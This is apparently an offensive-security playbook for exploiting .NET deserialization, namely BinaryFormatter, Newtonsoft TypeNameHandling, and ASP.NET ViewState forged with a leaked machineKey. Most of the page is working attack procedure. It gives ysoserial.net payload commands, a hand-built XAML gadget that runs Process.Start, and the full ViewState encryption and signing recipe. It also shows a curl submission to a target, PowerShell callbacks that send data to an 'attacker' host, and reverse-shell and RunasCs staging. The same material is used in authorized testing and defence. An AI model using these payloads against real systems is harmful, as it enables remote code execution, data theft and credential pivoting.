# .NET Deserialization (BinaryFormatter / SoapFormatter)

## When this applies

- Application uses `BinaryFormatter`, `NetDataContractSerializer`, or `SoapFormatter` on user data.
- ASP.NET ViewState with weak machineKey or no signing.
- Goal: instantiate a `TypeConfuseDelegate` / `ObjectDataProvider` / `WindowsIdentity` gadget for RCE.

## Technique

Detect via base64 prefix `AAEAAA` (BinaryFormatter). Generate payload with `ysoserial.net`. Inject into the deserialization sink (cookie, ViewState, RPC body).

## Steps

### Detection

```bash
# Check magic bytes for BinaryFormatter
echo "AAEAAAD..." | base64 -d | xxd | head
# Output: 00 01 00 00 = BinaryFormatter
```

### .NET serialization formats

```
BinaryFormatter    - Most dangerous
NetDataContractSerializer
SoapFormatter
XmlSerializer      - Less dangerous
DataContractSerializer
```

### ysoserial.net usage

```powershell
# List formatters
ysoserial.exe -h

# Generate payload
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "calc.exe"

# Common gadgets
TypeConfuseDelegate
ObjectDataProvider
PSObject
WindowsIdentity

# With different formatters
ysoserial.exe -f SoapFormatter -g TypeConfuseDelegate -c "cmd /c whoami"
ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "powershell -c calc"
```

### Common gadgets

| Gadget | Use case |
|--------|----------|
| TypeConfuseDelegate | Most reliable; works with BinaryFormatter |
| ObjectDataProvider | XAML/WPF apps |
| PSObject | PowerShell-related sinks |
| WindowsIdentity | When Identity context is deserialized |

### XmlSerializer (less common but possible)

Some apps use `XmlSerializer` with attacker-supplied type names — gadget classes that override `ToString()` / `Equals()` allow code execution paths.

## Verifying success

- ysoserial.net "calc.exe" payload pops calculator (visible at console / RDP).
- Out-of-band callback confirms RCE on a server-side payload.
- Stack trace reveals the deserialization sink class.

## Common pitfalls

- BinaryFormatter is deprecated in .NET 5+ — modern apps use safer JSON serializers.
- Some sinks wrap `BinaryFormatter` with a custom binder that restricts types — combine with other gadgets or LookAhead-aware payloads.
- ASP.NET ViewState typically has `EnableViewStateMac=true`; bypass requires the machineKey (look for hardcoded ones in source).

## Newtonsoft.Json `TypeNameHandling` (modern .NET / .NET 5+ Linux)

### Sink fingerprint

```csharp
JsonConvert.DeserializeObject(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All     // also .Auto / .Objects
    // no SerializationBinder = full type instantiation surface
});
```

`.All` / `.Auto` / `.Objects` without a `SerializationBinder` allow the attacker to supply any `[Newtonsoft.Json] $type` they want and Newtonsoft will instantiate it, calling property setters. `TypeNameAssemblyFormat = Simple` is a *format* knob — it does not gate which types are loaded.

### App-class gadget recipe (try this BEFORE ysoserial.net)

On modern .NET (5+, Core, Linux), classical ysoserial.net chains often fail:
- `TypeConfuseDelegate` reads `MulticastDelegate._invocationList` — renamed in .NET 5+, gadget no longer triggers.
- `WindowsIdentity` bridges to `BinaryFormatter` — heavily restricted in .NET 7+ even with `EnableUnsafeBinaryFormatterSerialization=true`.

Faster path: grep the application's own assembly for in-app gadgets:

```bash
# Source available
grep -rE 'set\s*\{[^}]*(Process\.Start|File\.WriteAllText|Assembly\.Load|XmlSerializer\.Deserialize|Activator\.CreateInstance)' app/

# Compiled assembly (use ilspycmd or dotnet-ilrepack)
ilspycmd MyApp.dll | grep -B2 -A4 'Process\.Start\|File\.WriteAllText'
```

Look for any class with a property setter, constructor, or `OnDeserialized` callback that invokes a dangerous sink. Common shapes:
- A `Helper` / `Utility` class with a `Command`, `Path`, `Expression`, or `Script` setter the developer used as an internal RPC/eval shortcut.
- A "logging" or "diagnostic" class that runs `Process.Start` from a setter.
- An "import" class whose constructor calls `Assembly.Load` on a path string.

### Payload shape

```json
{"$type":"<App>.<HelperClass>, <AssemblyName>", "<setter>":"<payload>"}
```

Base64 it if the sink lands behind a SQLi-fed UPDATE on a column the consumer base64-decodes. Smaller and more reliable than any ysoserial chain, and Linux/Windows portable.

### Cross-references

- Stacked SQLi for landing the payload on a back-end consumer row: [../../../../injection/reference/scenarios/sql/stacked-queries.md](../../../../injection/reference/scenarios/sql/stacked-queries.md) (SQLite via Microsoft.Data.Sqlite supports stacked queries — most ADO.NET providers don't).

## ASP.NET ViewState — leaked machineKey RCE chain (cross-platform)

### When this applies

- ASP.NET 4.5+ application using ViewState (`__VIEWSTATE` POST parameter)
- `web.config` machineKey leaked via LFI/path-traversal/source disclosure
- Want to land a deserialization gadget without a Windows attacker host

### Reading machineKey from web.config

Standard machineKey shape:

```xml
<machineKey decryption="AES" decryptionKey="<64hex>" validation="SHA1" validationKey="<128hex>" />
```

Note path-traversal filters that strip only `../` (forward-slash) — try `..\web.config` (backslash) on Windows targets. The `Regex.Replace(path, "../", "")` filter is the classic example; backslash bypasses it.

### Cross-platform tooling problem

`ysoserial.net` (and its successor `ysonet`) target .NET Framework 4.7.2 and require WPF assemblies (`PresentationCore`, `PresentationFramework`). On macOS/Linux, mono/wine fail at runtime:

- Mono: `MulticastDelegate.delegates` field rename / null reference in `TypeConfuseDelegate`
- mono on amd64-emulation: SIGABRT in `tramp-amd64.c`
- Mono ARM64 native: missing PresentationCore types load
- ViewStatePlugin uses `System.Web.Configuration.MachineKeySection` reflection — not in mono's System.Web

**Workaround**: hand-craft the BinaryFormatter binary in Python, then encrypt+sign per ASP.NET 4.5 spec.

### Hand-crafted BinaryFormatter for TextFormattingRunProperties + ObjectDataProvider

Most reliable gadget for IIS-hosted ASP.NET targets — `Microsoft.PowerShell.Editor.dll` ships with Windows + IIS. Format:

```
SerializationHeaderRecord (0x00)         RecordType + RootId(int32=1) + HeaderId(int32=-1) + Major(1) + Minor(0)
BinaryLibrary (0x0c)                     LibraryId=2 + name="Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
ClassWithMembersAndTypes (0x05)          ObjectId=1 + name="Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties" + 1 member "ForegroundBrush" (BinaryTypeEnum=String=1) + LibraryId=2
BinaryObjectString (0x06)                ObjectId=3 + <XAML payload>
MessageEnd (0x0b)
```

XAML payload uses `ObjectDataProvider` to call `Process.Start(cmd, args)`:

```xml
<ResourceDictionary
  xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
  xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
  xmlns:s="clr-namespace:System;assembly=mscorlib"
  xmlns:r="clr-namespace:System.Diagnostics;assembly=System">
  <ObjectDataProvider x:Key="" ObjectType="{x:Type r:Process}" MethodName="Start">
    <ObjectDataProvider.MethodParameters>
      <s:String>cmd</s:String>
      <s:String>/c &lt;your_cmd&gt;</s:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
</ResourceDictionary>
```

HTML-escape `<`, `>`, `&`, `"` in your command. C# `BinaryWriter` strings = 7-bit-encoded length + UTF-8 bytes.

### LosFormatter wrapper

Prepend `\xff\x01\x32` (Token_BinarySerialized) + 7-bit-encoded length + the BinaryFormatter bytes above. (Yes, `0x32` not `0x20`. `0x20` is Token_Marker for non-binary OSF objects.)

### ASP.NET 4.5 encrypt + sign (`AspNetCryptoServiceProvider.Protect`)

Reference: `microsoft/referencesource` `System.Web/Security/Cryptography/SP800_108.cs` and `Purpose.cs`.

1. Build purpose **label** + **context** for KBKDF:
   - `label = "WebForms.HiddenFieldPageStatePersister.ClientState"` (UTF-8)
   - `context = BinaryWriter.Write(spec1) || BinaryWriter.Write(spec2) || ...` where each Write = 7-bit-len + UTF-8 bytes
   - Specifics for ViewState:
     - `"TemplateSourceDirectory: " + (TemplateSourceDir).upper()` — e.g. `/PORTFOLIO`
     - `"Type: " + (TypeName).upper()` — e.g. `PORTFOLIO_DEFAULT_ASPX` (path with `.`/`/` replaced by `_`)
     - Optional: `"ViewStateUserKey: " + vsuk`

2. Derive subkeys via SP800-108 counter-mode KDF with HMACSHA512 PRF, output length = master key length:
   ```
   for i in 1..ceil(L/64):
     K_i = HMAC-SHA512(master, [i]_BE_uint32 || label || 0x00 || context || [L_bits]_BE_uint32)
   subkey = (K_1 || K_2 || ...)[:L]
   ```
   - `enc_subkey = KBKDF(decryptionKey, label, context, len(decryptionKey))`
   - `val_subkey = KBKDF(validationKey, label, context, len(validationKey))`

3. Encrypt: `iv = random(16); enc = AES_CBC(enc_subkey, iv, PKCS7_pad(losformatter_bytes))`
4. MAC: `sig = HMAC_SHA1(val_subkey, iv || enc)` (validation algorithm from web.config — SHA1/SHA256/SHA384/SHA512 supported)
5. Final `__VIEWSTATE` = `base64(iv || enc || sig)`

### Submission

```bash
# POST to the page that processes ViewState (any aspx in the app)
curl -X POST "http://target/portfolio/" \
  -H "Host: dev.target.tld" \
  --data-urlencode "__VIEWSTATE=<final_b64>" \
  --data-urlencode "__VIEWSTATEGENERATOR=<from_page_html>"
```

A 302 to `default.aspx?aspxerrorpath=...` means MAC failed OR deserialization failed (custom errors hide which). Verify keys via round-trip: decrypt the page's real `__VIEWSTATE` with your derived subkeys — plaintext should start with `\xff\x01`.

### Verifying RCE

ASP.NET app pool returns 302/error after PostBack regardless of side-effect. Confirm RCE via OOB:

- `cmd /c powershell -Command "iwr -Uri http://attacker:9999/PROBE -UseBasicParsing"` — watch HTTP server logs
- Encode result data in URL path: `iwr ('http://attacker/USER_' + [Convert]::ToBase64String(...))` — extracts data via 404 access logs

### Reverse shell delivery

PowerShell + UTF-16-LE base64-encoded reverse shell (revshells.com #3) fits in `__VIEWSTATE` for medium-length commands. Stage `RunasCs.exe` via `iwr -OutFile` for credential pivots when WinRM is internal-only.

### Verifying my keys against a captured ViewState (round-trip test)

If your encrypt+MAC math is wrong you'll get 302 indistinguishable from "MAC OK + gadget failed". Independent check:

```python
# given iv, enc, sig from a captured page __VIEWSTATE
expected = hmac.new(val_subkey, iv + enc, hashlib.sha1).digest()
assert expected == sig  # MAC formula correct

cipher = AES.new(enc_subkey, AES.MODE_CBC, iv)
plain = unpad(cipher.decrypt(enc), 16)
assert plain[:2] == b"\xff\x01"  # decryption correct
```

If both pass, your subkey derivation is right and any 302 from your gadget = deserialization-side issue, not transport.

## Tools

- ysoserial.net (legacy .NET Framework 4.x targets only)
- ysonet — modern fork, same Windows-only ViewStatePlugin issue on mono
- ilspycmd / dnSpyEx for in-app gadget hunting
- Burp .NET Beautifier and Minifier (BApp)
- Burp Suite Repeater
- Hand-crafted Python ViewState builder (above) when no Windows host available
